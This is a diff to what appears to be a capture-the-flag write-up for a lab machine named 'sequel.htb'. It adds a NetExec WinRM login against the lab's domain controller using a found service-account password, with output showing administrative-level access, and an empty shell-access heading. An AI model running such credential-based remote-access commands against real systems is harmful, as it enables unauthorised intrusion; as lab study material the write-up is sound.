@@ -285,5 +285,19 @@ SMB         10.129.7.162    445    DC               SYSVOL          READ        
 ```
 These credentials work
 
-Here is the access i have on SSH as this user
+Here is the access i have on `sql_svc` user
+
+```python
+nxc winrm dc.sequel.htb -u 'sql_svc' -p 'REGGIE1234ronnie'               
+WINRM       10.129.7.162    5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.129.7.162    5985   DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)
+```
+This user also has access via winrm
+
+## Shell access as `sql_svc`
+```python
+
+```
 
